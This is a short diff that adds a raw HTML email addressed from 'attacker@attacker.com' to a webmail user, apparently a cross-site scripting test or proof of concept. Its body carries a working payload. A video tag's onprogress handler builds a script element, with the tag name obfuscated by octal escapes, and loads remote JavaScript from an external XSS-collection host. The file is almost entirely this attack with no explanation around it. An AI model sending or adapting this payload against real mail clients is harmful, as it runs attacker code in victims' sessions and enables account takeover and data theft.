@@ -1,0 +1,7 @@
+From: <attacker@attacker.com>
+Subject: aaaaaaaaaaaaaaa
+To: victim@2980.com
+MIME-Version: 1.0
+Content-type: text/html
+
+aaa<video src=http://www.baidu.com/img/baidu_jgylogo3.gif onprogress=document.body.appendChild(document.createElement('scri\160\164')).src='http://xss.re/6896'>
